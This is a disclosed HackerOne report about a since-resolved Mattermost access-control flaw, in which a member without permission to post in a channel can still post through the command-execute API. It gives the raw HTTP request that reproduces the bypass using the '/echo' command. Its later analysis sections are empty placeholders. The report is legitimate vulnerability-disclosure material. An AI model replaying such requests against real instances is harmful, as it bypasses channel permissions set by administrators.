---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1851818'
original_report_id: '1851818'
title: Member role which doesn't have permission to send message can send by executing
  channel commands
weakness: Improper Access Control - Generic
team_handle: mattermost
created_at: '2023-01-30T15:44:27.531Z'
disclosed_at: '2024-05-08T14:14:55.990Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 25
asset_identifier: h1-*your-own-instance*.cloud.mattermost.com
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# Member role which doesn't have permission to send message can send by executing channel commands

## Metadata

- HackerOne Report ID: 1851818
- Weakness: Improper Access Control - Generic
- Program: mattermost
- Disclosed At: 2024-05-08T14:14:55.990Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Someone with a member permission who hasn't been given access to post message to the channel can post it by executing commands.

## Steps To Reproduce:

```
POST /api/v4/commands/execute HTTP/1.1
Host: test3.cloud.mattermost.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: */*
Accept-Language: en
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
X-CSRF-Token:5 [ jkue786iyfd6dkpiq7ftisys6y
Content-Type: application/json
Content-Length: 104
Origin: https://test3.cloud.mattermost.com
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"command":"/echo ami","channel_id":"khhnkrf5wf8yibwx8bd14s6fbw","team_id":"8jdphis493d4pbq3u1bagz643r"}
```

* Executing above command will post the message to the given channelID and TeamID when you try to reproduce it with your cookie.

## Impact

Someone who doesn't have permission to post message to the channel can still post it by executing channel commands.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
